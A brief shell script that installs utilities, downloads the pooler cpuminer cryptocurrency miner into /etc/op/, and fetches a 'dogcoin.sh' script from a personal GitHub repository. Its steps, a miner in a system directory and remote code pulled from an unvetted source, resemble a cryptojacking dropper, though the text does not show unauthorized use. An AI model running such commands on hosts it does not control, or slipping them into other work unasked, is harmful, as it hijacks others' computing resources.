yum -y install screen nano wget 
apt-get update
apt-get install screen nano wget
mkdir /etc/op/
curl -o /etc/op/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz -L https://github.com/pooler/cpuminer/releases/download/v2.5.1/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
tar -xvf /etc/op/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz -C /etc/op/ 
rm -rf /etc/op/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
curl -o /etc/op/dogcoin.sh -L https://raw.githubusercontent.com/rezabagh/reza/master/dogcoin.sh
